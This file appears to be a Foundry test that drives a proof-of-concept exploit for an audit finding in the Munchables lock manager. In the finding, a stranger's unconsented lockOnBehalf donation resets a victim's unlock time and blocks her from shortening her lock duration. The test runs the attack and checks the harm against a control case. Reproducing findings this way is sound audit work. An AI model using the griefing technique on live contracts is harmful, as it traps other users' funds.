// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./33594-h-01-malicious-user-can-call-lockonbehalf-repeatedly-extend.sol";

/*//////////////////////////////////////////////////////////////////////////
    Munchables [H-01] — lockOnBehalf griefs a victim's setLockDuration via an
    unconsented donation.

    Driver test for the cheatcode-free synthetic. Deploys the Exploit (which
    wires the reduced LockManager + an Alice relay in its constructor), runs
    the attack sequence, and independently re-asserts the harm:
      * before any donation, Alice can freely lower her preferred lock
        duration (control),
      * a stranger's 1-quantity `lockOnBehalf` donation resets Alice's
        unlockTime without her consent,
      * afterwards, the EXACT SAME setLockDuration call that succeeded in
        the control now reverts.
//////////////////////////////////////////////////////////////////////////*/
contract LockOnBehalfGriefTest is Test {
    function test_lockOnBehalf_griefsVictimsSetLockDuration() public {
        Exploit exp = new Exploit();
        LockManager lm = exp.lm();
        address alice = exp.alice();

        (, uint32 unlockTimeBefore, ) = lm.lockedTokens(alice, address(0));
        assertEq(unlockTimeBefore, 0, "alice starts with a clean slate");

        // === attack: control succeeds, donation griefs, same call now fails ===
        exp.run();

        // HARM #1 — Alice's unlockTime was set by a donation she never made
        // and never consented to.
        (uint256 qty, uint32 unlockTimeAfter, ) = lm.lockedTokens(alice, address(0));
        assertEq(qty, 1, "the stranger's 1-quantity donation is recorded under alice's own balance");
        assertGt(unlockTimeAfter, block.timestamp, "alice's unlockTime was pushed into the future by a stranger");

        // HARM #2 — independently re-verify: the exact call that succeeded
        // in the control (setLockDuration(1 hours)) now reverts for Alice.
        AliceRelay relay = exp.aliceRelay();
        (bool ok, ) = relay.relay(abi.encodeWithSelector(LockManager.setLockDuration.selector, uint32(1 hours)));
        assertFalse(ok, "alice remains blocked from lowering her preferred lock duration");
    }

    /// @notice Control: without ANY donation ever happening, setLockDuration
    ///         to a short value always succeeds -- confirming the guard only
    ///         misfires because of the unconsented lockOnBehalf call.
    function test_control_noDonation_setLockDurationSucceeds() public {
        LockManager lm = new LockManager();
        AliceRelay relay = new AliceRelay(lm);

        (bool ok, ) = relay.relay(abi.encodeWithSelector(LockManager.setLockDuration.selector, uint32(1 hours)));
        assertTrue(ok, "with no donation ever made, alice can freely set a short lock duration");
    }
}
